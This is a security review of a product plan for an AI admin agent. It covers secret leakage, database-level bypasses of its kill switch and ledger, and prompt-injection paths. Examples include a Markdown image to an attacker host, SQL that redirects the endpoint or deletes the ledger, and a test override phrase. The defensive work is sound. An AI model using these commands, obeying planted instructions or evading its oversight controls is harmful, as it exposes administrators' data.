# OcuPilot PRD — adversarial safety and security review

## Verdict

The PRD gets the headline architecture right — one explicit confirmation per write, enforced on the instance, tools that run as the user, an agent marker in the audit database — and then leaves every one of those promises loosely enough specified that a compliant implementation can be unsafe. As written, FR-11 ships whatever the user is typing into the SSL/TLS, wallet, user-password and agent-key forms to a cloud model on every turn by default, which NFR-5 forbids in words but no requirement prevents; the kill switch, read-only flag, agent definitions, ledger and transcripts all land in the install namespace's default database (`HSCUSTOM` or `USER`), where any developer with write access can clear the switch, redirect the provider endpoint to their own server, or edit the ledger with a single SQL statement; "confirmation bound to that proposal" is never defined tightly enough to rule out replay, client-authored proposals, hidden payload fields, or a write executed against an entity that changed while the card was being read; and NFR-6's "delimited as data, never as instructions" is not a testable boundary, while the agent's context includes text that unauthenticated remote callers can plant (failed-login user names in the audit database, log lines), and the reply renderer has no rule against remote images, the standard exfiltration channel. None of these needs a redesign. Each needs a sentence of requirement, and the review below supplies it. Do not hand this PRD to architecture or epics until the critical and high findings are folded in.

Findings: 4 critical, 11 high, 13 medium, 8 low.

## Critical

- **[critical]** Screen context ships form secrets to the LLM provider by default (FR-11, NFR-5, §7.2) — FR-11 says screen context includes "the current form's values", and the toggle defaults to on. So a user typing a private key into the SSL/TLS editor (FR-42), a secret value into the wallet editor (FR-46), a password into Create User (FR-36) or Set Password (FR-37), or an API key into the agent definition form (FR-26), and then asking the agent anything, sends the unsaved secret to OpenAI, to the transcript on the instance, and into the ledger's recorded LLM-call arguments (FR-21). NFR-5's "write-only through the UI and the OcuPilot API" is true and irrelevant: screen context is a third path the PRD never closes. *Fix:* Add to FR-11: every form field typed as secret (password, private key, secret value, API key, token) is excluded from screen context unconditionally, and screens that carry such fields declare a context class that sends route and entity identity only, never form values. Add to FR-21: LLM-call arguments are stored only after the same exclusion; the ledger never holds a screen-context payload the screen would have refused to send. Add a test: type a sentinel into each secret field on each secret-bearing screen, send a turn, assert the sentinel appears in neither the provider request nor the transcript nor the ledger.

- **[critical]** Governance state, definitions, ledger and transcripts live in a developer-writable database (FR-19, FR-20, FR-21, FR-24, §7.2, addendum §6) — Install targets `HSCUSTOM` else `USER`, and nothing says OcuPilot's persistent classes live anywhere but that namespace's default database. On the target instances that database is writable by every developer (`%DB_HSCUSTOM` / `%DB_USER` is routinely granted, and `_SYSTEM` has `%All`). "Every configuration endpoint checks the resource server-side" (FR-29) is bypassed entirely by `UPDATE OcuPilot_Agent.Definition SET Endpoint='https://attacker/v1'` from the SQL shell, by `KILL ^OcuPilot.Config` to clear an enforced read-only mode or kill switch, by `DELETE FROM OcuPilot_Audit.Ledger`, and by `SELECT * FROM OcuPilot_Chat.Transcript` to read every administrator's conversations including their screen rows. The OcuPilot administrative resource protects the API; it protects nothing under the API. *Fix:* Add to FR-66: the installer creates a dedicated OcuPilot database protected by a dedicated resource that no ordinary role holds, and maps OcuPilot's globals and packages into it; FR-19, FR-20, FR-21, FR-24 and the transcript store all persist there and nowhere else. Add to FR-29: the only path to that data is the OcuPilot API, which reaches it through a narrowly scoped privilege escalation confined to the storage methods and never in effect while tool code, admin API calls or file reads run. Add a test: a user holding `%DB_HSCUSTOM:RW` and `%Admin_Operate` but not the OcuPilot resource cannot read or write any OcuPilot table or global through SQL or direct global access.

- **[critical]** "Confirmation bound to that proposal" is undefined and admits replay, forgery, hidden payload and stale-target writes (FR-17, §7.1) — The PRD never says who mints the proposal, what "bound" means, what the executor writes, or how long a confirmation lives. A compliant implementation can let the client POST `{proposal, confirmed:true}` in one request (client-authored proposal), accept the same confirmation twice (a replayed "run task now" runs twice), execute a payload whose fields exceed those on the card (a user-update tool carrying `Password` alongside the displayed `Enabled`), or overwrite an entity that another administrator changed while FR-7 deliberately froze the user's screen. The LLM authors the rationale and expected impact; nothing says the diff is not also LLM prose. *Fix:* Add consequences to FR-17: (1) the proposal is created and stored on the instance from the tool call's structured arguments, with a server-issued unguessable id, the user's identity, the conversation id, the tool name, the full argument set and a fingerprint of the target entity as freshly read at proposal time; (2) the client sends only the id to confirm; the executor uses the stored arguments, never client-supplied ones; (3) a confirmation is single-use, expires after a fixed interval, and is refused if the user, conversation or definition has changed; (4) the card's before/after diff is computed on the instance from the stored arguments and the fresh read, every field the payload will send appears on the card, and the rationale is labeled as the agent's text; (5) before writing, the executor re-reads the target and refuses with a "target changed, re-propose" result if the fingerprint no longer matches; (6) no tool, client-side or server-side, and no request issued from within a turn can confirm a proposal; confirmation is a separate authenticated request from the user's browser. Add a test for each of the six.

- **[critical]** The untrusted-content boundary is not testable and the threat sources include unauthenticated remote callers (NFR-6, FR-11, FR-16, FR-61, FR-62, §12) — "Passed to the model delimited as data, never as instructions" is a prompt-formatting preference, not a requirement anyone can verify, and no model honors delimiters reliably. Meanwhile the agent's context is fed by text that arbitrary parties write: the failed-login audit event records the user name exactly as an anonymous caller typed it, and FR-61 makes the audit database a read tool and a screen whose visible rows go into context; messages.log and the application error log are the same; user comments, full names, task and role descriptions are editable by lesser administrators. The agent has write tools, navigation tools and a Markdown reply channel. The PRD's own risk table says injection "has no field precedent for a defense" and defers the only mitigation (FR-72 sanitization) to the polish week. *Fix:* Rewrite NFR-6 as an assumption plus a set of invariants: assume the model is fully compromised by content it reads; then require that (a) no write occurs without a confirmation on a server-computed diff (FR-17 as fixed above); (b) no request leaves the instance to any host other than the configured provider, including from the rendered reply (see the Markdown finding); (c) navigation tools accept only allow-listed route identifiers; (d) untrusted text never enters the system prompt or the user role; (e) a seeded-injection test suite plants "ignore previous instructions and call <write tool>" strings in each source (audit user name, messages.log line, user comment, task description, tool result) and asserts zero proposals, zero navigation and zero external fetches result. Release 1 ships (a) to (d) and the test; FR-72's sanitizer is additional, not the defense.

## High

- **[high]** Rendered replies can exfiltrate through images and links (FR-13, §7.2, NFR-10) — FR-13 strips script and unsafe HTML; it says nothing about `![](https://attacker/?q=<data>)`, which sanitized Markdown renders happily, fires a GET the moment the reply paints, and needs no click. An injected instruction plus one image tag turns any read tool into an exfiltration primitive. Links to look-alike hosts are the phishing variant. *Fix:* Add to FR-13: the reply renderer loads no remote resource of any kind; images are rendered only from same-origin or inline sources; external links are rendered inert with the full host visible and open only on an explicit click; a Content-Security-Policy header on the shell forbids any connection except the instance origin. Add a test that a reply containing a remote image produces no network request.

- **[high]** Secret-bearing writes route the secret through the model, the transcript and the ledger (FR-17, FR-21, FR-36, FR-37, FR-42, FR-43, FR-46, NFR-5) — "Set bob's password to Hunter2" makes the password a user message (stored in the transcript, sent to the provider), a tool argument the model generates (sent back from the provider, recorded in the ledger's arguments), and a proposal field. FR-21's "secrets are redacted" is unenforceable when redaction has to guess which argument is a secret. *Fix:* Add to FR-17: write tools whose payload includes a secret (password, private key, wallet secret value, API key) declare the field as secret in their input schema and do not accept it from the model; the proposal card renders a masked input that the user fills at confirmation time, and the value travels only in the confirmation request. Add to FR-21: redaction is schema-driven — every input schema marks secret fields and the ledger writer drops them by schema, not by pattern. Add to FR-13 / the panel: a warning when the outgoing user message matches a password-like pattern on a secret-bearing screen.

- **[high]** Runs-as-user is asserted, not specified, and the custom endpoints need privileges the user may not hold (FR-18, FR-62, FR-63, FR-60, FR-65, addendum §2) — Reading messages.log from the manager directory, tailing alerts.log, and emitting audit events all need privileges an `%Admin_Operate` user lacks, so the OcuPilot API will escalate somewhere. Nothing forbids the easy route: application roles or matching roles on `/api/ocupilot`, which elevate every request to every endpoint, tool code included. The addendum's third candidate for long turns, "execute tools in-process under the user's session", is where an escalation left switched on becomes a privilege the user does not hold. And if the server refreshes the user's token pair during a turn (candidate two), it holds a bearer credential that must not reach the ledger. *Fix:* Add to FR-65: `/api/ocupilot` carries no application roles and no matching roles, and the installer asserts this. Add to FR-18: any escalation on the instance is scoped to a named storage or file-read method, checks an explicit IRIS resource first (messages.log and alerts.log require the same resource the classic portal's log pages require), and is provably not in effect when tool or admin API code runs; the user's tokens held on the instance during a turn live in process memory only, are never written to the ledger or transcript, and are discarded when the turn ends. Add a test: a user without the log resource gets 403 from the log endpoints, and a user without `%Admin_Secure` cannot reach any security write through any OcuPilot endpoint or tool.

- **[high]** Kill switch, read-only mode and privileges are checked at the wrong moment and their flips are unaudited (FR-19, FR-20, §7.1) — UJ-4 says a killed agent shows "on his next turn". A turn in flight keeps calling the provider and read tools after the switch flips, and a proposal card left on screen can still be confirmed afterwards; the PRD never requires the confirmation endpoint to re-check anything. The per-user read-only toggle "in the panel" could be client state. Who flipped the instance-wide switch, when, and from what to what, is nowhere recorded. *Fix:* Add to FR-19 and FR-20: the enforced read-only state, the per-user read-only state, the kill switch, the definition's read-only flag and the user's privileges are evaluated on the instance before every provider call, before every tool call and at confirmation time; an in-flight turn aborts at its next step when the switch changes; the per-user toggle is stored on the instance. Add to FR-29: every change to the kill switch, enforced read-only mode, a definition or (polish week) the governance policy emits an OcuPilot audit event naming the actor, the target and the old and new values.

- **[high]** Whoever edits a shared definition redirects every user's screen data (FR-24, FR-25, FR-27, addendum §1.1) — Definitions are instance-wide. Changing the endpoint URL of the default definition to an attacker's OpenAI-compatible server silently forwards every user's screen rows, log lines and questions there, with the API key in the header. The change is not audited (FR-29 has no such consequence), the users cannot see which host they are talking to until the polish-week egress line (FR-71), and the "OpenAI-compatible over plain HTTP" rung sends the key in clear. Test connection POSTs to any URL an administrator types and displays the response body, which is a server-side request forgery probe against the instance's network from a screen that exists to be used. *Fix:* Add to FR-24: changing provider, endpoint or credential disables the definition until Test connection passes again; every definition change is audited with old and new endpoint. Add to FR-25: plain HTTP is accepted only when no credential is configured, or with an explicit acknowledgement stored on the definition. Add to FR-27: the outbound URL is refused for loopback, link-local and metadata addresses unless the administrator explicitly allows a private host; the displayed response is truncated to a bounded length. Pull the provider name and host into the Release 1 context chip (see the egress finding).

- **[high]** The agent marker can be silently omitted, and the write path does not notice (FR-22, FR-21, FR-47, NFR-7, SM-5) — The marker is a separate OcuPilot audit event emitted after the admin API write returns. If the process dies between the two, if IRIS auditing is off, or if an administrator disabled OcuPilot's user events through FR-47 (a write tool the agent itself can propose), the write lands unmarked and nothing fails. The project's own rule file records that `$System.Security.Audit` returns 0 and drops the event without error. SM-5 counts marked events without a proposal, which is the harmless direction; the dangerous direction — confirmed proposal executed, no marker — is unmeasured. *Fix:* Add to FR-22: the ledger row for a confirmed write is created before the admin API call and finalized after; the return value of the audit emission is checked and a failure is recorded on the ledger row and shown on the tool-call card; when auditing is off or OcuPilot's events are disabled, the panel shows an "agent writes are not being marked" banner to every user and the write executor records the condition per write. Add to FR-47: disabling OcuPilot's own audit events warns specifically, and the agent never proposes disabling auditing or its own events without that warning in the card. Flip SM-5 to "zero confirmed proposals in the ledger without a matching marked event in the audit database", and keep the existing direction as a second line.

- **[high]** Default data egress is visible rows to a cloud provider with no disclosure until the polish week (FR-11, FR-71, §7.2) — Screen context is on by default; a turn on the Users list sends every visible user with email and mobile; on the audit viewer, every visible event; on messages.log, the log. The provider chip and egress line are polish-week rows, so a Release 1 user cannot tell whether "the agent" is Ollama on localhost or a cloud endpoint. The context toggle "resets to on for a new session", so a cautious user's choice is silently undone tomorrow, and an OcuPilot administrator has no way to set the default to off for a regulated instance. *Fix:* Move the provider name and host into Release 1's context chip (a one-line change from FR-71's polish-week text). Add to FR-11: the toggle's state is remembered per user; an instance-level default for the toggle is part of the enforced-state settings (FR-19); when a definition's endpoint is not a private-network host, the chip says "leaves the instance".

- **[high]** The turn endpoint is open to any IRIS login, with no per-user budget or rate limit (FR-3, FR-18, §7.3) — FR-3 acknowledges that a user with no `%Admin_*` resource can sign in; the turn endpoint is never gated on anything beyond a password. Any application user with a password can burn the shared provider key: the conversation lock is per conversation, conversations are per screen context, and per-turn token limits multiply by however many turns and tabs the caller opens. Every turn also holds an instance process for up to 300 seconds, on Community editions with hard process and connection ceilings. *Fix:* Add to FR-65: `/api/ocupilot` carries a resource gate (an OcuPilot user resource created at install, or `%Admin_Operate:USE`), and the turn endpoint refuses users holding no `%Admin_*` resource with the FR-3 message. Add to §7.3: a per-user concurrent-turn limit and a per-user turns-per-hour limit in the definition, enforced on the instance in Release 1; token metering can stay in Stage 2.

- **[high]** Administrator transcript access launders privilege (§7.2, FR-72, decision 14) — A transcript holds screen context and tool results: the rows a `%Admin_Secure` holder saw on the Users and audit screens. An OcuPilot administrator holding only `%Admin_Operate` plus the OcuPilot resource reads them through the transcript viewer, obtaining data IRIS would have refused them directly. The ledger has the same property. *Fix:* Add to FR-72 and §7.2: a user may open another user's transcript or ledger rows only if they hold every resource the transcript's tool calls required (recorded per ledger row from the tool's declared resource), or the viewer shows the user's messages and the agent's replies with tool results and screen context redacted. State which.

- **[high]** Release 1 ships every destructive write behind a single click (§7.1, FR-72, addendum §4) — The governance policy with "default-disabled destructive writes" is polish week, so on 2026-09-27 the agent can propose deleting a user (including the last `%All` account: only the current user is protected, FR-37), deleting a role or an SSL configuration that the superserver or a mirror uses, disabling auditing, disabling `%Service_WebGateway`, suspending the Task Manager, or terminating any process the user does not own, each cleared by one Confirm. The L4 list names backups, databases and journals, none of which Release 1 has a tool for, and none of the destructive tools Release 1 does have. The screens require typed confirmation naming the entity for deletes; the agent path does not. *Fix:* Add to FR-17: each write tool declares a destructive flag in the registry; destructive proposals require the user to type the target's name in the card, matching the screens' own confirmations. Add to §7.1 a Release 1 L4 list that matches the Release 1 tool set: deleting or disabling the current user, the last user holding `%All`, and the `_SYSTEM` account; disabling the web service that serves OcuPilot; terminating IRIS system processes; deleting OcuPilot's web applications, resource or role. Those are refused on the instance, not merely warned.

- **[high]** Proposals have no lifecycle (FR-7, FR-12, FR-17) — FR-12 keeps the transcript across reloads; FR-7 pauses refresh while a card is open; FR-17 allows several proposals per turn and nothing says what happens to a pending card when the user sends another message, navigates away, reloads a day later, or when the target changes underneath the frozen screen. A card confirmed hours after it was proposed executes against a state nobody looked at. *Fix:* Add to FR-17: a proposal expires after a fixed interval; it is cancelled, with the agent told so, when a new turn starts in the conversation, when the definition or the user's read-only state changes, and on confirmation of any sibling that touches the same entity; a card restored from a reloaded transcript is shown as expired, never live. Add to FR-7: the pause is bounded by the proposal's expiry.

## Medium

- **[medium]** The OcuPilot administrative resource reduces to `%Admin_Secure` (FR-29, FR-37, FR-39, UJ-4) — Any user with `%Admin_Secure` grants themselves the OcuPilot role through OcuPilot's own Permissions screens, or asks the agent to propose it; only self-disable and self-delete are refused. The "instance administrator turned on read-only mode" story in UJ-4 holds against the agent, not against a security administrator, and the PRD reads as if it holds against both. *Fix:* State in FR-29 that the resource restrains the agent and is not a boundary against users holding `%Admin_Secure` or `%All`; require the OcuPilot audit event on every grant of the OcuPilot resource or role, whether by screen or by agent; consider refusing an agent proposal that grants the OcuPilot resource to the requesting user.

- **[medium]** The provider key is readable by every code-executing user on the instance (FR-26) — The environment-variable rung is readable from any namespace by `$System.Util.GetEnviron`; the interoperability credentials rung is readable by anyone with the credentials resource or SQL on the namespace. "Never shown back by any OcuPilot API call" is true and does not make the key a secret from a developer with a terminal. *Fix:* Say so in FR-26 and the install documentation; pull the wallet-backed rung (Stage 2) forward if the wallet write payloads are verified in time; require that provider error text is scrubbed of any substring of the key before display or logging, since some providers echo a key prefix.

- **[medium]** Sign-out is incomplete across tabs and there is no idle expiry (FR-1, FR-2, addendum §2) — The spike observed that logout ends the calling tab's `sid` and, with the cookie, the browser-level login. Another tab's refresh token, minted under its own `sid`, stays valid up to 900 seconds. The browser-id cookie has no expiry and re-mints without a password after any idle period, so an unattended browser is signed in until someone finds the sign-out control. *Fix:* Add to FR-2: sign-out revokes every token pair the shell holds in every tab (a broadcast to sibling tabs, each calling revoke) and is verified by a test that a sibling tab's refresh fails afterwards. Add to FR-1: after a configurable idle interval the shell discards its pair and requires the form login rather than silently re-minting; test that a disabled user, and a user whose password changed, cannot silently re-mint.

- **[medium]** One token authorizes every JWT application on the instance, so a stolen OcuPilot token is an instance token (addendum §2, FR-1, NFR-3) — The spike shows the `app` claim is not enforced; a token minted by `/api/ocupilot` is accepted by `/api/admin`, `/api/security-config`, the FHIR management API and the OAuth2 APIs. The addendum's option to raise OcuPilot's access lifetime to 300 seconds widens the theft window on all of them. Tokens live in `sessionStorage`, readable by any script that lands in the page, and the agent reply is attacker-influenced content rendered into that page. *Fix:* Keep the access lifetime at the vendor's 60 seconds unless architecture shows a need; add to FR-13 and NFR-3 a strict Content-Security-Policy on the shell (no inline script, no remote sources, connect only to the origin) as a testable consequence; note in NFR-3 that the token's scope is instance-wide by vendor design.

- **[medium]** Navigation tools are side effects listed as reads (FR-15, FR-11) — A navigation call changes the next turn's screen context, so an injected instruction can steer the agent to the screen whose rows it wants, move the user away from a pending proposal's context, or, if the tool takes a URL rather than a route id, open anything. "The agent announces where it is taking the user" is LLM text. *Fix:* Add to FR-15: navigation tools accept only route identifiers and entity ids from an allow-list, never URLs or free text beyond a filter value; they are classed as side effects in the registry (not reads), recorded in the ledger, and refused while a proposal is pending on the current screen.

- **[medium]** The model can draw its own proposal cards (FR-13, FR-17) — Nothing distinguishes a real card from Markdown that looks like one. An injected reply can render a convincing "Proposal: enable /csp/myapp — Confirm" above the real card for a different target, and the user confirms the real one. *Fix:* Add to FR-13: proposal and tool-call cards are rendered from structured server objects in a region the Markdown renderer cannot produce, and the Confirm control repeats the target and diff in the confirming gesture itself; Markdown cannot render buttons or form controls.

- **[medium]** Docker start un-expires every password and may run on every start (FR-67, NFR-9, CLAUDE.md) — The documented fix is `UnExpireUserPasswords("*")`. An idempotent start script that runs it on every `docker compose up` reverts every deliberately expired password on the durable volume, forever. The compose file also publishes 52774 with `_SYSTEM`/`SYS`. *Fix:* Add to FR-67: the start path un-expires only the install account and only on first start of a fresh durable volume; the IPM installer never touches password expiry; the README labels the compose workspace a development convenience and says what to change for anything else.

- **[medium]** Upgrade and re-install can undo hardening (FR-66, FR-67) — "Creates the web applications only if absent" is right; "upgrades the installed OcuPilot to the image's version" is unbounded. An upgrade that re-applies the recommended web application settings resets a resource an administrator added to `/api/ocupilot`, re-enables CORS, or replaces a tightened authentication method. *Fix:* Add to FR-66: upgrade changes code and registers new audit events and routes; it never rewrites an existing web application's security settings, the governance state, or the definitions, and a test compares the settings before and after an upgrade.

- **[medium]** Ledger is not append-only, not correlated, and loses the client address (FR-21, FR-22, NFR-7) — Nothing forbids an update or delete path over ledger rows, the retention purge task is named for transcripts without saying whether the ledger goes with them, the OcuPilot audit event carries no ledger row or proposal id so NFR-7's "without correlating by hand" is aspirational, and when tools call the admin API from the instance the IRIS system event records the loopback address as the client. *Fix:* Add to FR-21: ledger rows are written once through the API with no update or delete endpoint; retention for the ledger is separate from transcripts and never shorter than the audit database's. Add to FR-22: the OcuPilot audit event carries the proposal id and ledger row id, and the user's real client address as seen by the OcuPilot API.

- **[medium]** Writes may be retried or replayed on timeout (FR-23, FR-17) — Provider retry with backoff is right for the provider; nothing says the executor never re-issues a write whose HTTP call timed out but may have succeeded (run task now, terminate process, delete). *Fix:* Add to FR-17: a write tool call is issued exactly once per confirmation; on timeout the result is "unknown" and the card says so; the same confirmation cannot be resubmitted.

- **[medium]** Online demo instance is a public agent with write tools and a cloud key (FR-79) — A public instance with `_SYSTEM`/`SYS`, a live provider key and confirmable writes is a key-theft and cost target from the hour it goes up. *Fix:* Add to FR-79: the demo runs with enforced read-only mode on, a demo user holding a bounded role rather than `%All`, a provider key with a hard spend cap, rate limits per source address, and a scheduled reset; or the demo runs a local model.

- **[medium]** OcuPilot bypasses the classic portal's per-page resource overlays (FR-4, addendum §7) — FR-4 says the classic portal's finer gates are not reproduced, and the addendum notes custom portal resources are keyed by classic page URL. A shop that denied a page by custom resource finds the same function reachable through OcuPilot because the admin API authorizes by `%Admin_*` alone. This is not an escalation OcuPilot creates — the admin API already grants it — but the PRD should say so rather than let it surface as a bug report. *Fix:* State in FR-4 that custom portal resources are not honored in Release 1 and name the Stage that maps routes back to classic keys; add a note to the install documentation for shops that use them.

- **[medium]** Test connection and the turn endpoint accept client-supplied provider configuration (FR-27, FR-24) — "The test uses the definition as edited, before save" means the test endpoint takes a full provider configuration, including a key, from the client. If the turn endpoint accepts a definition id or any provider field from the client, the Stage 3 picker's plumbing becomes a Release 1 hole: a user posts their own endpoint and the instance forwards screen data there. *Fix:* Add to FR-24: the turn endpoint takes no provider, endpoint, model or credential from the client and resolves the default enabled definition on the instance; add to FR-27: the test endpoint requires the OcuPilot resource, never logs the request body, and is subject to the outbound URL rules above.

## Low

- **[low]** Read-only mode is agent-only, not an instance freeze (FR-19, UJ-4) — The screens still write in read-only mode by design. Say so in FR-19 and in the panel text, so nobody sells it as change control.

- **[low]** The agent marker is a text string anyone can emit (FR-22) — Nothing restricts who can emit an audit event with OcuPilot's source, type and name and the marker text, so a manual change can be dressed as an agent change. *Fix:* Carry the proposal id in the event (above) and have the viewer's marker filter show whether a ledger row backs the event.

- **[low]** Tool list and definitions reveal the surface to every user (FR-16, FR-24) — Every authenticated user can read the full tool registry and every definition's endpoint host. Acceptable; say it is deliberate, and keep the credential reference name out of the non-administrator view.

- **[low]** Static handler and classic links need the usual hygiene (FR-9, FR-65, addendum §6) — The unauthenticated catch-all must reject path traversal and serve only the bundle directory (the addendum says harvest the checks; the PRD should require the test); classic portal links open with `rel="noopener"`; "Serve Files Always" is development-only and the installer sets it off.

- **[low]** Conversation lock has no timeout or cancel (FR-12) — A provider hang locks the conversation for the full gateway timeout with no way out. Add a lock TTL and a user cancel that aborts the turn on the instance.

- **[low]** Read tools return unbounded rows to the provider (FR-16) — "The same filters the screen offers" without a cap means a thousand-row list goes to the model. Cap rows per read tool at the screen's page size and say so in the tool schema.

- **[low]** Confirm must never be reachable by accident (FR-17) — Enter in the message box while a card holds focus, or a card whose Confirm is the default focused element, is a one-keystroke write. Require that Confirm is never the default focus and never bound to the message-send key.

- **[low]** Session-scoped `%SYS` switches on the error path (FR-8, addendum §3) — The OcuPilot API will switch namespaces for `%SYS`-only classes; the project's own rules already ban `New $NAMESPACE` in dispatch handlers. Add the consequence to FR-8: every endpoint restores the namespace on every error path, with a test that a forced error returns the correct envelope, not `<CLASS DOES NOT EXIST>`.
